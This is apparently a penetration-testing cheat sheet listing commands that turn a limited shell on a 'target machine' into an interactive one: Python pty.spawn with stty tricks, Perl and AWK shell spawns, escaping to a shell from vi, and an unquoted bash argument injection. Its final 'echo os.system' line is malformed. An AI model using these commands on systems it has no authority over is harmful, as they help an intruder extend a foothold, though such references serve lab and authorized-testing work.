- - - 
###### Is Python present on the target machine ??

```sh
python -c 'import pty; pty.spawn("/bin/bash")'
         OR
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='clear && ls -lsaht --color=auto'

Ctrl + Z [Background Process]

stty raw -echo ; fg ; reset
stty columns 200 rows 200
```
<br>

###### Is perl present on the target machine?

```sh
perl -e 'exec "/bin/bash";'
perl -e 'exec "/bin/sh";'
```
<br>

##### Is AWK present on the target machine? 

```sh
awk 'BEGIN {system("/bin/bash -i")}'
awk 'BEGIN {system("/bin/sh -i")}'
```
<br>

##### With Vi :

```sh
vi 
:set shell=/bin/bash
:shell
```
<br>

##### Bash Command Unquoted Expresion Injection : 

https://stackoverflow.com/questions/65399335/unquoted-expression-injection-bash
```sh
./yourscript "0 -o foo" 
```
<br>

##### With echo : 

```sh
echo os.system("/bin/bash") 
```